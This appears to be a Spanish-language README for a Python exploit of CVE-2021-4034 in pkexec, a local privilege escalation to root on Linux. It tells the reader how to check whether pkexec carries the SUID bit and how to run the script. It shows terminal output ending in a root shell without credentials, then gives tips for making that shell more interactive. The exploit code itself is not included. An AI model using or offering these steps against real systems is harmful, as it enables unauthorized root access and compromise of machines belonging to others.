El uso de este script en python aprovecha la vulnerabilidad en el archivo pkexec para ganar acceso a root sin proporcionar credenciales

· Detecta si el binario tiene los privilegios SUID, en este caso es vulnerable

    usuario@GatoGamer:~$ ls -la /usr/bin/pkexec
    .rwsr-xr-x 1 root root /usr/bin/pkexec
    usuario@GatoGamer $

· Ejecuta el exploit para ganar acceso a root, en este caso solo es necesario ejecutarlo con python3, al terminar tendrás una consola como root

    usuario@GatoGamer:~$ python3 CVE-2021-4034.py
     [+] Iniciando el exploit
     [+] Exploit Completado
    # whoami
    root
    #

· Como complemento, puedes cambiar el valor de TERM, puede ser a 'xterm' o 'xterm-256color' para mejor estética, además ejecutar una shell un poco mas interactiva como una bash

    # export TERM=xterm-256color
    # bash
    root@GatoGamer:~#
    
· Ejemplo

<img src="https://cdn.discordapp.com/attachments/933074927131697213/964306305609261067/4034.png">
